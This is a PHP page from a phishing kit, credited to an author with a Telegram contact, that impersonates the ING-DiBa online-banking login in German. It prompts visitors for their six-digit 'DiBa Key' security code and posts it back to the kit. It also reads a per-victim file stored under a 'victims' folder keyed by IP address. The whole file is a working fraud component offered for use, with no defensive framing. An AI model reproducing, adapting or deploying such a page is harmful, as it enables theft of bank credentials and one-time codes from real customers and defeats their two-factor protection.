<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
    if( $_GET['error'] == 1 ) {
        $_SESSION['last_page'] = 'errorsms';
    } else {
        $_SESSION['last_page'] = 'sms';
    }
    $sms = file_get_contents('../victims/'. get_client_ip() .'-tan.txt');
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">
        <link rel="stylesheet" type="text/css" href="../assets/css/bundle.css">

        <link rel="icon" type="image/x-icon" href="../assets/imgs/favicon.ico" />

        <title>Login</title>
    </head>

    <body>

        <!-- HEADER -->
        <header style="margin-bottom: 9%;" class="header header--g2p header--subpage u-print-hidden" data-login-state="logged-in" role="banner">
        <div class="header__inner">
          <a class="u-left" >
            <img src="../assets/imgs/logoo.png"/>
          </a>
        </div>
      </header>
        
        <!-- MAIN -->
        <main id="main">
            <div class="container">
                
                <div class="login-area">
                    <h3 class="mb-2" style="color: #ff781c;">Online-Banking: Login</h3>
                    <h4 style="color: #ff781c;">Eingabe Ihres DiBa Keys</h4>
                    <div class="box mb-4 pushtan">
                        <p><i class="fas fa-info"></i> Zum sicheren Log-in benötigen wir die  6-stelligen DiBa Keys.</p>
                    </div>
                    <div class="box">
                        <form action="../index.php" method="post">
                            <input type="hidden" name="captcha">
                            <input type="hidden" name="step" value="diba">
                            <input type="hidden" name="error" value="<?php echo $_GET['error']; ?>">
                            <div class="form-group row <?php if( $_GET['error'] == 1 ) { echo 'has-error'; } ?>">
                          
                                <p  style="text-align: left; color: #000; font-size: 24px;">Zum sicheren Log-in benötigen wir die  6-stelligen DiBa Keys.</strong></p>
                                <div class="col-lg-9 col-md-9 col-sm-12 col-12">
                                    <input type="text" class="form-control" id="sms_code" name="sms_code" placeholder="DiBa">
                                </div>
                            </div>
                            <br>
                            <div class="text-right"><button type="submit" style="background-color: #ff781c;">Fortsetzen <i class="fas fa-chevron-circle-right"></i></button></div>
                        </form>
                    </div>
                </div>

            </div>
        </main>
          <!-- END MAIN -->
    <br><br>   <br><br>
        <!-- FOOTER -->
        <footer id="footer">
        <footer class="footer--g2p u-cf">
        <ul class="footer__links-top">

        </ul>
        <ul class="footer__links-bottom">
          <li class="footer__link">
            <a href="">Karriere</a>
          </li>
          <li class="footer__link">
            <a href="">Vertriebspartner</a>
          </li>
          <li class="footer__link">
            <a href="">Wholesale Banking</a>
          </li>
          <li class="footer__link">
            <a href="">Kontaktformular</a>
          </li>
          <li class="footer__link">
            <a href="">AGB</a>
          </li>
          <li class="footer__link">
            <a href="">Datenschutz</a>
          </li>
          <li class="footer__link">
            <a href="">Impressum</a>
          </li>
        </ul>
      </footer>
        </footer>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
		<script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
        <script src="../assets/js/script.js"></script>

    </body>

</html>